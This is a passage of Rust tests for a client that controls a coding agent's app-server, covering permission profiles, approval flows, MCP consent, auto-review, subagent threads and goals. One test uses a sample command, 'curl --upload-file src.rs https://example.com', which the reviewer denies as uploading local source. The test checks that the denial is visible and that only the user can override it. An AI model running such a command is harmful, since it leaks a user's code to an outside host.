            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                panic!("profile request")
            };
            let request: Value = serde_json::from_str(&line).unwrap();
            assert_eq!(
                request,
                json!({"id":3,"method":"permissionProfile/list","params":{"cwd":"/workspace","cursor":null}})
            );
            let OptionDescriptor::Select { options, .. } =
                permission_descriptor(&profiles, "ask", &Value::Null)
            else {
                panic!("select")
            };
            assert_eq!(
                options
                    .iter()
                    .filter(|option| option.value.starts_with("profile:"))
                    .map(|option| (
                        &*option.value,
                        option.description.as_deref(),
                        option.unavailable.is_some()
                    ))
                    .collect::<Vec<_>>(),
                vec![
                    ("profile:restricted", Some("Only this workspace"), false),
                    (
                        "profile:blocked",
                        Some("Configured permission profile"),
                        true
                    )
                ]
            );
            for (settings, label, description) in [
                (
                    json!({"sandboxPolicy":{"type":"workspaceWrite"},"approvalPolicy":"never","approvalsReviewer":"user"}),
                    "Current permissions",
                    "workspace sandbox, never asks for approval, reviewed by you.",
                ),
                (
                    json!({"activePermissionProfile":{"id":"my-team"},"sandboxPolicy":{"type":"workspaceWrite"},"approvalPolicy":"on-request","approvalsReviewer":"user"}),
                    "my-team",
                    "Profile my-team: workspace sandbox, asks on request, reviewed by you.",
                ),
                (
                    json!({"activePermissionProfile":{"id":"my-team"},"sandboxPolicy":{"type":"readOnly"},"approvalPolicy":"untrusted","approvalsReviewer":"auto_review"}),
                    "my-team",
                    "Profile my-team: read-only sandbox, asks for untrusted actions, reviewed by auto-review.",
                ),
                (
                    json!({"sandboxPolicy":{"type":"externalSandbox"},"approvalPolicy":{"granular":{"sandbox_approval":false}},"approvalsReviewer":"guardian_subagent"}),
                    "Current permissions",
                    "external sandbox, uses granular approval rules, reviewed by auto-review.",
                ),
                (
                    json!({"sandbox":"danger-full-access","approvalPolicy":"on-request","approvalsReviewer":"user"}),
                    "Current permissions",
                    "full access, asks on request, reviewed by you.",
                ),
            ] {
                actor.handle_line(&json!({"method":"thread/settings/updated","params":{"threadId":"thread-1","threadSettings":settings}}).to_string()).await;
                let AgentEvent::ProviderOptions {
                    descriptors,
                    selections,
                } = events.try_recv().unwrap()
                else {
                    panic!("confirmed permissions")
                };
                let OptionDescriptor::Select { options, .. } = &descriptors[0] else {
                    panic!("select")
                };
                let selected = options
                    .iter()
                    .find(|option| json!(option.value) == selections[0].value)
                    .unwrap();
                assert_eq!(selected.label, label);
                assert_eq!(selected.description.as_deref(), Some(description));
                assert_eq!(
                    selected.unavailable.as_deref(),
                    Some("Inherited permission configuration")
                );
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn permission_requests_reply_with_native_grants_and_cancel_aborts() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-1"}}}"#).await;
            let _ = events.recv().await.unwrap();
            for (rpc_id, decision, expected) in [
                (
                    90,
                    ApprovalDecision::Option("session".into()),
                    json!({"permissions":{"network":{"enabled":true}},"scope":"session"}),
                ),
                (
                    91,
                    ApprovalDecision::Cancel,
                    json!({"permissions":{},"scope":"turn"}),
                ),
            ] {
                actor.handle_line(&json!({"id":rpc_id,"method":"item/permissions/requestApproval","params":{
                    "threadId":"thread-child","turnId":"turn-child","itemId":"permissions-1","environmentId":null,"startedAtMs":1,"cwd":"/workspace","reason":"Access network","permissions":{"network":{"enabled":true},"fileSystem":null}
                }}).to_string()).await;
                let AgentEvent::ApprovalRequested(request) = events.recv().await.unwrap() else {
                    panic!("native permission request")
                };
                assert_eq!(
                    request
                        .options
                        .iter()
                        .map(|option| option.id.as_str())
                        .collect::<Vec<_>>(),
                    vec!["turn", "session", "decline"]
                );
                assert!(actor.lines.try_recv().is_err());
                actor
                    .handle_command(SessionCommand::RespondApproval {
                        request_id: request.id,
                        decision,
                    })
                    .await
                    .unwrap();
                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                    panic!("native granted profile")
                };
                assert_eq!(
                    serde_json::from_str::<Value>(&line).unwrap(),
                    json!({"id":rpc_id,"result":expected})
                );
                assert!(matches!(
                    events.recv().await.unwrap(),
                    AgentEvent::ApprovalResolved { .. }
                ));
                if rpc_id == 91 {
                    let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                        panic!("native interrupt")
                    };
                    let request: Value = serde_json::from_str(&line).unwrap();
                    assert_eq!(request["method"], "turn/interrupt");
                    assert_eq!(
                        request["params"],
                        json!({"threadId":"thread-child","turnId":"turn-child"})
                    );
                }
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn mcp_tool_consent_uses_native_options_without_preapproval() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.handle_line(r#"{"method":"mcpServer/elicitation/request","id":0,"params":{"threadId":"thread-1","turnId":"turn-1","serverName":"tcode_report","mode":"form","_meta":{"codex_approval_kind":"mcp_tool_call","persist":["session","always"],"tool_description":"Harmless permission probe: return PONG.","tool_params":{},"tool_params_display":[]},"message":"Allow the tcode_report MCP server to run tool \"probe\"?","requestedSchema":{"type":"object","properties":{}}}}"#).await;
            let AgentEvent::ApprovalRequested(request) = events.recv().await.unwrap() else {
                panic!("MCP consent")
            };
            assert_eq!(
                request
                    .options
                    .iter()
                    .map(|option| option.id.as_str())
                    .collect::<Vec<_>>(),
                vec!["accept", "accept:session", "accept:always", "decline"]
            );
            assert!(
                actor.lines.try_recv().is_err(),
                "consent must wait for the user"
            );
            actor
                .handle_command(SessionCommand::RespondApproval {
                    request_id: request.id,
                    decision: ApprovalDecision::Option("accept:session".into()),
                })
                .await
                .unwrap();
            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                panic!("consent response")
            };
            assert_eq!(
                serde_json::from_str::<Value>(&line).unwrap(),
                json!({"id":0,"result":{"action":"accept","content":{},"_meta":{"persist":"session"}}})
            );
            let config = crate::McpRegistration {
                name: "tcode_report".into(),
                url: "http://127.0.0.1/mcp".into(),
                bearer_token: "probe".into(),
            }
            .codex_config_override();
            let (_, table) = config.split_once('=').unwrap();
            let config: toml::Value = toml::from_str(&format!("server={table}")).unwrap();
            assert_eq!(
                config["server"]
                    .as_table()
                    .unwrap()
                    .keys()
                    .cloned()
                    .collect::<Vec<_>>(),
                vec!["http_headers", "url"]
            );
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn auto_review_denial_is_visible_and_only_explicitly_overridden() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.handle_line(&json!({"method":"item/autoApprovalReview/started","params":{
                "threadId":"thread-child","turnId":"turn-1","reviewId":"review-1","targetItemId":"command-1",
                "review":{"status":"inProgress","riskLevel":null,"rationale":null},
                "action":{"type":"command","command":"curl --upload-file src.rs https://example.com","cwd":"/workspace"}
            }}).to_string()).await;
            let AgentEvent::ItemStarted(item) = events.recv().await.unwrap() else {
                panic!("running review in the timeline")
            };
            assert_eq!(item.id, "review-1");
            assert_eq!(item.parent_item_id, None);
            assert!(
                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::InProgress, .. }
                if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
                && detail == "Risk: unknown. Command: curl --upload-file src.rs https://example.com")
            );
            actor.handle_line(&json!({"method":"item/autoApprovalReview/completed","params":{
                "threadId":"thread-child","turnId":"turn-1","reviewId":"review-1","targetItemId":"command-1","startedAtMs":1,"completedAtMs":2,"decisionSource":"agent",
                "review":{"status":"denied","riskLevel":"high","userAuthorization":"low","rationale":"Uploads local source"},
                "action":{"type":"execve","source":"unifiedExec","program":"applyPatch","argv":["inProgress","unifiedExec"],"cwd":"/workspace"}
            }}).to_string()).await;
            let AgentEvent::ItemCompleted(item) = events.recv().await.unwrap() else {
                panic!("failed review in the timeline")
            };
            assert_eq!(item.id, "review-1");
            assert!(
                matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status:ItemStatus::Failed, .. }
                if name == "Auto-reviewer" && input["targetItemId"] == "command-1"
                && detail == "Uploads local source\nRisk: high. Command: applyPatch inProgress unifiedExec")
            );
            let AgentEvent::ApprovalRequested(request) = events.recv().await.unwrap() else {
                panic!("explicit guardian override")
            };
            assert_eq!(request.options[0].id, "thread/approveGuardianDeniedAction");
            assert!(actor.lines.try_recv().is_err());
            actor
                .handle_command(SessionCommand::RespondApproval {
                    request_id: request.id.clone(),
                    decision: ApprovalDecision::Option(request.options[0].id.clone()),
                })
                .await
                .unwrap();
            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                panic!("guardian override")
            };
            let native: Value = serde_json::from_str(&line).unwrap();
            assert_eq!(native["method"], "thread/approveGuardianDeniedAction");
            assert_eq!(
                native["params"],
                json!({"threadId":"thread-child","event":{
                    "id":"review-1","turn_id":"turn-1","target_item_id":"command-1","started_at_ms":1,"completed_at_ms":2,"decision_source":"agent","status":"denied","risk_level":"high","user_authorization":"low","rationale":"Uploads local source",
                    "action":{"type":"execve","source":"unified_exec","program":"applyPatch","argv":["inProgress","unifiedExec"],"cwd":"/workspace"}
                }})
            );
            actor
                .handle_line(&json!({"id":native["id"],"result":{}}).to_string())
                .await;
            assert!(
                matches!(events.recv().await.unwrap(),AgentEvent::ApprovalResolved {request_id,..} if request_id==request.id)
            );
            for (review_status, expected_status, action, summary) in [
                (
                    "approved",
                    ItemStatus::Completed,
                    json!({"type":"command","command":"pwd","cwd":"/workspace"}),
                    "Command: pwd",
                ),
                (
                    "timedOut",
                    ItemStatus::Failed,
                    json!({"type":"applyPatch","cwd":"/workspace","files":["src.rs","Cargo.toml"]}),
                    "Patch files: src.rs, Cargo.toml",
                ),
                (
                    "aborted",
                    ItemStatus::Failed,
                    json!({"type":"networkAccess","target":"https://example.com","host":"example.com","protocol":"https","port":443}),
                    "Network target: https://example.com (example.com:443 via https)",
                ),
                (
                    "approved",
                    ItemStatus::Completed,
                    json!({"type":"mcpToolCall","server":"tcode_report","toolName":"report_result"}),
                    "MCP tool: tcode_report/report_result",
                ),
                (
                    "approved",
                    ItemStatus::Completed,
                    json!({"type":"requestPermissions","reason":"Read shared files","permissions":{"network":{"enabled":true},"fileSystem":{"read":["/shared"],"write":["/output"],"entries":[{"path":{"type":"glob_pattern","pattern":"/cache/**"},"access":"read"}]}}}),
                    "Requested permissions: network access; read: /shared; write: /output; read: /cache/** (Read shared files)",
                ),
                (
                    "approved",
                    ItemStatus::Completed,
                    json!({"type":"writeStdin","processId":"42","stdin":"yes\n","cwd":"/workspace"}),
                    "Input to process 42: yes\n",
                ),
            ] {
                actor.handle_line(&json!({"method":"item/autoApprovalReview/completed","params":{
                    "threadId":"thread-1","reviewId":"review-2","targetItemId":"action-2",
                    "review":{"status":review_status,"riskLevel":"low","rationale":"Routine action"},"action":action
                }}).to_string()).await;
                let AgentEvent::ItemCompleted(item) = events.try_recv().unwrap() else {
                    panic!("terminal review")
                };
                assert_eq!(item.id, "review-2");
                assert!(
                    matches!(item.content, ItemContent::ToolCall { name, input, output:Some(detail), status, .. }
                    if name == "Auto-reviewer" && status == expected_status && input["summary"] == summary
                    && input["targetItemId"] == "action-2" && detail == format!("Routine action\nRisk: low. {summary}"))
                );
                assert!(
                    events.try_recv().is_err(),
                    "only denied reviews offer an override"
                );
                assert!(
                    actor.lines.try_recv().is_err(),
                    "a verdict does not approve an action"
                );
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn fork_request_uses_native_method_and_resume_thread_id() {
        let resume = ResumeCursor(json!({"thread_id": "thread-source"}));
        let (method, params) = resume_request(&resume, true, "/workspace").unwrap();
        assert_eq!(method, "thread/fork");
        assert_eq!(params["threadId"], "thread-source");

        let (method, _) = resume_request(&resume, false, "/workspace").unwrap();
        assert_eq!(method, "thread/resume");
    }

    #[test]
    fn selected_context_window_rides_thread_config() {
        assert_eq!(thread_config(&[]), None);
        let selections = [
            OptionSelection {
                id: "serviceTier".into(),
                value: json!("flex"),
            },
            OptionSelection {
                id: "contextWindow".into(),
                value: json!("500k"),
            },
        ];
        assert_eq!(
            thread_config(&selections),
            Some(json!({ "model_context_window": 500_000 }))
        );
    }

    #[test]
    fn mcp_builder_handles_both_one_and_none() {
        let registrations = [
            crate::McpRegistration {
                name: "tcode_preview".into(),
                url: "http://p".into(),
                bearer_token: "p".into(),
            },
            crate::McpRegistration {
                name: "tcode_orchestrate".into(),
                url: "http://o".into(),
                bearer_token: "o".into(),
            },
            crate::McpRegistration {
                name: "tcode_computer_use".into(),
                url: "http://c".into(),
                bearer_token: "c".into(),
            },
        ];
        for count in [0, 1, 3] {
            let args = mcp_args(&registrations[..count]);
            assert_eq!(args.len(), count * 2);
            for (arg, (key, url, authorization)) in args.as_chunks::<2>().0.iter().zip([
                ("mcp_servers.tcode_preview", "http://p", "Bearer p"),
                ("mcp_servers.tcode_orchestrate", "http://o", "Bearer o"),
                ("mcp_servers.tcode_computer_use", "http://c", "Bearer c"),
            ]) {
                assert_eq!(arg[0], "-c");
                let (actual_key, value) = arg[1].split_once('=').unwrap();
                assert_eq!(actual_key, key);
                let doc: toml::Value = toml::from_str(&format!("v = {value}")).unwrap();
                let table = &doc["v"];
                assert_eq!(table["url"].as_str(), Some(url));
                assert_eq!(
                    table["http_headers"]["Authorization"].as_str(),
                    Some(authorization)
                );
                assert!(table.get("bearer_token").is_none());
            }
        }
    }

    fn test_actor() -> (Actor, Receiver<AgentEvent>) {
        let mut child = crate::process::test_echo_command()
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        let stdin = BufWriter::new(child.stdin.take().unwrap());
        let stdout = child.stdout.take().unwrap();
        let (line_tx, line_rx) = smol::channel::unbounded();
        std::thread::spawn(move || {
            let mut ready = false;
            for line in BufReader::new(stdout).lines().map_while(Result::ok) {
                if !ready {
                    ready = line == crate::process::TEST_ECHO_READY;
                    continue;
                }
                if line_tx.send_blocking(ChildOutput::Line(line)).is_err() {
                    return;
                }
            }
        });
        let (event_tx, event_rx) = smol::channel::unbounded();
        (
            Actor {
                protocol:protocol::Protocol::default(),
                child,
                stderr_tail: StderrTail::default(),
                stdin,
                lines: line_rx,
                events: event_tx,
                thread_id: "thread-1".into(),
                cwd: std::env::temp_dir(),
                model: Some("gpt-5-codex".into()),
                effort: None,
                service_tier: None,
                requested_permission: "ask".into(),
                effective_permission: "ask".into(),
                permission_descriptor: permission_descriptor(&[], "ask", &Value::Null),
                next_id: 1,
                pending_requests: HashMap::new(),
                approvals: HashMap::new(),
                guardian_denials: HashMap::new(),
                user_inputs: HashMap::new(),
                elicitations: HashMap::new(),
                async_questions: None,
                items: HashMap::new(),
                current_turn_items: HashSet::new(),
                subagents: HashMap::new(),
                subagent_parent_by_thread: HashMap::new(),
                seen_subagent_activities: HashSet::new(),
                pending_steers: Vec::new(),
                usage_by_turn: HashMap::new(),
                usage_totals_by_turn: HashMap::new(),
                active_turn: None,
                retry: None,
                retry_deadline: None,
                capacity_retries: 0,
                last_turn_options: None,
                interrupted: false,
                instructions: None,
            },
            event_rx,
        )
    }

    #[test]
    fn child_thread_lifecycle_preserves_parent_steer_and_interrupt() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for (thread, turn) in [("thread-1", "T1"), ("thread_child", "T2")] {
                actor
                    .handle_line(
                        &json!({"method":"turn/started", "params":{
                            "threadId":thread, "turn":{"id":turn}
                        }})
                        .to_string(),
                    )
                    .await;
            }
            assert_eq!(actor.active_turn.as_deref(), Some("T1"));
            assert!(
                matches!(events.try_recv().unwrap(), AgentEvent::TurnStarted { turn_id } if turn_id == "T1")
            );
            assert!(events.try_recv().is_err());
            for (command, method, field) in [
                (
                    SessionCommand::Steer {
                        request_id: "steer".into(),
                        text: "redirect".into(),
                        attachments: Vec::new(),
                    },
                    "turn/steer",
                    Some("expectedTurnId"),
                ),
                (SessionCommand::Interrupt, "turn/interrupt", Some("turnId")),
                (SessionCommand::Compact, "thread/compact/start", None),
            ] {
                actor.handle_command(command).await.unwrap();
                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                    panic!("expected echoed request")
                };
                let request: Value = serde_json::from_str(&request).unwrap();
                assert_eq!(request["method"], method);
                assert_eq!(request["params"]["threadId"], "thread-1");
                if let Some(field) = field {
                    assert_eq!(request["params"][field], "T1");
                }
            }
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    /// Shapes from the 0.164.0 app-server schema (`ThreadGoalSetParams`,
    /// `ThreadGoalUpdatedNotification`, `ThreadGoalClearedNotification`).
    #[test]
    fn goal_commands_and_notifications_use_the_thread_goal_wire() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for (command, expected) in [
                (
                    SessionCommand::SetGoal {
                        objective: Some("Ship the goal strip".into()),
                        status: None,
                    },
                    json!({"method":"thread/goal/set", "params":{
                        "threadId":"thread-1", "origin":"user", "objective":"Ship the goal strip"
                    }}),
                ),
                (
                    SessionCommand::SetGoal {
                        objective: None,
                        status: Some(GoalStatus::Paused),
                    },
                    json!({"method":"thread/goal/set", "params":{
                        "threadId":"thread-1", "origin":"user", "status":"paused"
                    }}),
                ),
                (
                    SessionCommand::ClearGoal,
                    json!({"method":"thread/goal/clear", "params":{
                        "threadId":"thread-1", "origin":"user"
                    }}),
                ),
            ] {
                actor.handle_command(command).await.unwrap();
                let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                    panic!("expected echoed request")
                };
                let request: Value = serde_json::from_str(&request).unwrap();
                assert_eq!(request["method"], expected["method"]);
                assert_eq!(request["params"], expected["params"]);
            }
            let goal = json!({
                "threadId":"thread-1", "objective":"Ship the goal strip", "status":"budgetLimited",
                "tokenBudget":50000, "tokensUsed":63876, "timeUsedSeconds":120,
                "createdAt":1, "updatedAt":2
            });
            for line in [
                json!({"method":"thread/goal/updated", "params":{
                    "threadId":"thread_child", "turnId":null, "goal":goal
                }}),
                json!({"method":"thread/goal/updated", "params":{
                    "threadId":"thread-1", "turnId":"T1", "goal":goal
                }}),
                json!({"method":"thread/goal/cleared", "params":{"threadId":"thread-1"}}),
            ] {
                actor.handle_line(&line.to_string()).await;
            }
            assert_eq!(
                events.try_recv().unwrap(),
                AgentEvent::GoalUpdated {
                    goal: Some(Goal {
                        objective: "Ship the goal strip".into(),
                        status: GoalStatus::BudgetLimited,
                        tokens_used: Some(63876),
                        token_budget: Some(50000),
                        time_used_secs: Some(120),
                        checks: None,
                        last_check: None,
                    })
                }
            );
            assert_eq!(
                events.try_recv().unwrap(),
                AgentEvent::GoalUpdated { goal: None }
            );
            assert!(events.try_recv().is_err());
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn child_thread_completion_preserves_active_turn_and_usage() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.active_turn = Some("T1".into());
            actor
                .usage_by_turn
                .insert("T2".into(), TokenUsage::default());
            actor
                .handle_line(
                    &json!({"method":"turn/completed", "params":{
                        "threadId":"thread_child", "turn":{"id":"T2", "status":"completed"}
                    }})
                    .to_string(),
                )
                .await;
            assert_eq!(actor.active_turn.as_deref(), Some("T1"));
            assert!(actor.usage_by_turn.contains_key("T2"));
            assert!(events.try_recv().is_err());
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn child_thread_items_route_to_known_or_synthetic_parent() {
        smol::block_on(async {
            for known in [true, false] {
                let (mut actor, events) = test_actor();
                if known {
                    actor.handle_line(&json!({"method":"item/started", "params":{
                        "threadId":"thread_child", "item":{"type":"subAgentActivity", "id":"spawn",
                        "agentThreadId":"thread_child", "kind":"started"}
                    }}).to_string()).await;
                    while events.try_recv().is_ok() {}
                }
                let parent = if known {
                    "spawn"
                } else {
                    "codex-subagent:thread_child"
                };
                let previous = actor.items.get("spawn").cloned();
                for method in ["item/started", "item/updated", "item/completed"] {
                    // A colliding id must not overwrite or acquire the parent's Subagent content.
                    actor.handle_line(&json!({"method":method, "params":{
                        "threadId":"thread_child", "item":{"type":"agentMessage", "id":"spawn", "text":"child reply"}
                    }}).to_string()).await;
                    let event = events.try_recv().unwrap();
                    let item = match (method, event) {
                        ("item/started", AgentEvent::ItemStarted(item))
                        | ("item/updated", AgentEvent::ItemUpdated(item))
                        | ("item/completed", AgentEvent::ItemCompleted(item)) => item,
                        (_, event) => panic!("unexpected event: {event:?}"),
                    };
                    assert_eq!(item.parent_item_id.as_deref(), Some(parent));
                    assert!(
                        matches!(item.content, ItemContent::AssistantMessage { text } if text == "child reply")
                    );
                    assert_eq!(actor.items.get("spawn"), previous.as_ref());
                    assert!(events.try_recv().is_err());
                }
                assert_eq!(
                    actor
                        .subagent_parent_by_thread
                        .get("thread_child")
                        .map(String::as_str),
                    Some(parent)
                );
                let _ = actor.child.kill();
                let _ = actor.child.wait();
            }
        });
    }

    #[test]
    fn child_thread_deltas_and_parent_only_updates_are_ignored() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for method in [
                "item/agentMessage/delta",
                "item/reasoning/summaryTextDelta",
                "item/reasoning/textDelta",
                "item/commandExecution/outputDelta",
                "command/exec/outputDelta",
                "item/plan/delta",
                "turn/diff/updated",
                "turn/plan/updated",
                "thread/tokenUsage/updated",
            ] {
                actor.handle_line(&json!({"method":method, "params":{
                    "threadId":"thread_child", "turnId":"T2", "itemId":"message", "delta":"child text",
                    "diff":"", "plan":[], "tokenUsage":{"last":{"inputTokens":12,"outputTokens":3}}
                }}).to_string()).await;
                assert!(events.try_recv().is_err(), "unexpected event for {method}");
            }
            for kind in ["contextCompaction"] {
                for method in ["item/started", "item/updated", "item/completed"] {
                    actor.handle_line(&json!({"method":method, "params":{
                        "threadId":"thread_child", "item":{"type":kind,"id":"special","text":"child plan"}
                    }}).to_string()).await;
                    assert!(events.try_recv().is_err());
                }
            }
            assert!(actor.usage_by_turn.is_empty());
            assert!(actor.items.is_empty());
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn instructions_ride_additional_context_and_return_after_a_mid_turn_compaction() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.protocol.additional_context = true;
            actor.protocol.methods.insert("thread/inject_items".into());
            actor.instructions =
                Some("<pull_request_linking>\nLink every PR.\n</pull_request_linking>\n\n".into());
            for delivery_id in [1, 2] {
                actor
                    .handle_command(SessionCommand::SendTurn {
                        delivery_id,
                        text: "hello".into(),
                        options: None,
                        attachments: Vec::new(),
                    })
                    .await
                    .unwrap();
                let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                    panic!("native request")
                };
                let request: Value = serde_json::from_str(&line).unwrap();
                assert_eq!(request["method"], "turn/start");
                assert_eq!(
                    request["params"]["additionalContext"],
                    json!({"tcode": {"kind": "application", "value": "<pull_request_linking>\nLink every PR.\n</pull_request_linking>\n\n"}})
                );
                assert_eq!(request["params"]["input"][0]["text"], "hello");
            }
            actor
                .handle_line(r#"{"method":"turn/started","params":{"threadId":"thread-1","turn":{"id":"turn-2"}}}"#)
                .await;
            actor
                .handle_line(r#"{"method":"item/started","params":{"threadId":"thread-1","item":{"type":"contextCompaction","id":"compaction"}}}"#)
                .await;
            actor
                .handle_line(r#"{"method":"item/completed","params":{"threadId":"thread-1","item":{"type":"contextCompaction","id":"compaction"}}}"#)
                .await;
            let ChildOutput::Line(line) = actor.lines.recv().await.unwrap() else {
                panic!("native request")
            };
            let request: Value = serde_json::from_str(&line).unwrap();
            assert_eq!(request["method"], "thread/inject_items");
            assert_eq!(
                request["params"],
                json!({"threadId": "thread-1", "items": [{
                    "type": "message",
                    "role": "developer",
                    "content": [{"type": "input_text", "text": "<tcode><pull_request_linking>\nLink every PR.\n</pull_request_linking>\n\n</tcode>"}],
                }]})
            );
            let compactions: Vec<bool> = std::iter::from_fn(|| events.try_recv().ok())
                .filter_map(|event| match event {
                    AgentEvent::ContextCompacted(c) => Some(c.in_progress),
                    _ => None,
                })
                .collect();
            assert_eq!(compactions, [true, false]);
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn notifications_without_thread_id_keep_parent_behavior() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            for (method, params) in [
                ("turn/started", json!({"turn":{"id":"T1"}})),
                (
                    "item/completed",
                    json!({"item":{"type":"agentMessage","id":"message","text":"parent"}}),
                ),
                (
                    "item/agentMessage/delta",
                    json!({"itemId":"message","delta":"more"}),
                ),
                (
                    "turn/completed",
                    json!({"turn":{"id":"T1","status":"completed"}}),
                ),
            ] {
                actor
                    .handle_line(&json!({"method":method,"params":params}).to_string())
                    .await;
                let event = events.try_recv().unwrap();
                match method {
                    "turn/started" => {
                        assert!(
                            matches!(event, AgentEvent::TurnStarted { turn_id } if turn_id == "T1")
                        );
                        assert_eq!(actor.active_turn.as_deref(), Some("T1"));
                    }
                    "item/completed" => assert!(matches!(
                        event,
                        AgentEvent::ItemCompleted(ThreadItem {
                            parent_item_id: None,
                            ..
                        })
                    )),
                    "item/plan/delta" | "item/agentMessage/delta" => {
                        assert!(matches!(event, AgentEvent::Delta { .. }))
                    }
                    _ => {
                        assert!(
                            matches!(event, AgentEvent::TurnCompleted { turn_id, .. } if turn_id == "T1")
                        );
                        assert!(actor.active_turn.is_none());
                    }
                }
            }
            assert!(events.try_recv().is_err());
            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn async_question_answers_steer_the_running_turn_with_codex_reply_envelope() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
            actor.active_turn = Some("turn-1".into());
            // Shape recorded from codex-cli 0.156 `request_user_input_async`.
            actor
                .handle_line(
                    &json!({"method":"item/completed","params":{"threadId":"thread-1","turnId":"turn-1","item":{
                        "type":"agentMessage","id":"call_q","text":"Which DB?\n- Postgres\n- SQLite",
                        "phase":"final_answer","delivery":"async",
                        "questions":[{"title":"Which DB?","options":["Postgres","SQLite"]},{"title":"  "}]
                    }}})
                    .to_string(),
                )
                .await;
            // The listing text is not an answer; the transcript keeps the call.
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(ThreadItem {
                    content: ItemContent::ToolCall { ref name, ref input, .. },
                    ..
                }) if name == "request_user_input_async"
                    && input["questions"][0]["title"] == "Which DB?"
            ));
            let AgentEvent::UserInputRequested {
                request_id,
                questions,
                delivery,
            } = events.recv().await.unwrap()
            else {
                panic!("expected UserInputRequested")
            };
            assert_eq!(request_id, "call_q");
            assert_eq!(delivery, UserInputDelivery::Async);
            assert_eq!(questions.len(), 1, "blank titles are dropped");
            assert_eq!(
                questions[0].id,
                r#"["request_user_input_async","call_q",0]"#
            );
            assert_eq!(questions[0].question, "Which DB?");
            assert_eq!(
                questions[0]
                    .options
                    .iter()
                    .map(|option| option.label.as_str())
                    .collect::<Vec<_>>(),
                ["Postgres", "SQLite"]
            );

            let mut answers = serde_json::Map::new();
            answers.insert(questions[0].id.clone(), json!("SQLite"));
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "call_q".into(),
                    answers,
                })
                .await
                .unwrap();
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::SteerRequested { ref request_id, ref text, .. }
                    if request_id == "codex-question-reply-call_q"
                        && text == "> Which DB?\n\nSQLite"
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::UserInputResolved { ref request_id, .. } if request_id == "call_q"
            ));
            let ChildOutput::Line(request) = actor.lines.recv().await.unwrap() else {
                panic!("expected echoed request")
            };
            let request: Value = serde_json::from_str(&request).unwrap();
            assert_eq!(request["method"], "turn/steer");
            assert_eq!(request["params"]["expectedTurnId"], "turn-1");
            let envelope = "<send_user_message_question_reply>\n\
                [{\"answer\":\"SQLite\",\"question\":\"Which DB?\",\
                \"questionItemId\":\"[\\\"request_user_input_async\\\",\\\"call_q\\\",0]\"}]\n\
                </send_user_message_question_reply>";
            assert_eq!(request["params"]["input"][0]["text"], envelope);

            let id = request["id"].as_i64().unwrap();
            actor
                .handle_line(&json!({"id": id, "result": {"turnId": "turn-1"}}).to_string())
                .await;
            actor
                .handle_line(
                    &json!({"method":"item/completed","params":{"threadId":"thread-1","item":{
                        "type":"userMessage","id":"u1","content":[{"type":"text","text":envelope}]
                    }}})
                    .to_string(),
                )
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::SteerAccepted { ref request_id } if request_id == "codex-question-reply-call_q"
            ));

            // Questions still open when the turn ends can no longer be answered.
            actor
                .handle_line(&json!({"method":"item/completed","params":{"threadId":"thread-1","item":{
                    "type":"agentMessage","id":"call_r","text":"Later?","questions":[{"title":"Later?"}]
                }}}).to_string())
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::ItemCompleted(_)
            ));
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::UserInputRequested { ref request_id, .. } if request_id == "call_r"
            ));
            actor
                .handle_line(&json!({"method":"turn/completed","params":{"threadId":"thread-1","turn":{"id":"turn-1","status":"completed"}}}).to_string())
                .await;
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::TurnCompleted { .. }
            ));
            let mut answers = serde_json::Map::new();
            answers.insert(
                r#"["request_user_input_async","call_r",0]"#.into(),
                json!("yes"),
            );
            actor
                .handle_command(SessionCommand::RespondUserInput {
                    request_id: "call_r".into(),
                    answers,
                })
                .await
                .unwrap();
            assert!(matches!(
                events.recv().await.unwrap(),
                AgentEvent::Warning { .. }
            ));
            assert!(events.try_recv().is_err());

            let _ = actor.child.kill();
            let _ = actor.child.wait();
        });
    }

    #[test]
    fn steer_acceptance_waits_for_the_consumed_user_message_echo() {
        smol::block_on(async {
            let (mut actor, events) = test_actor();
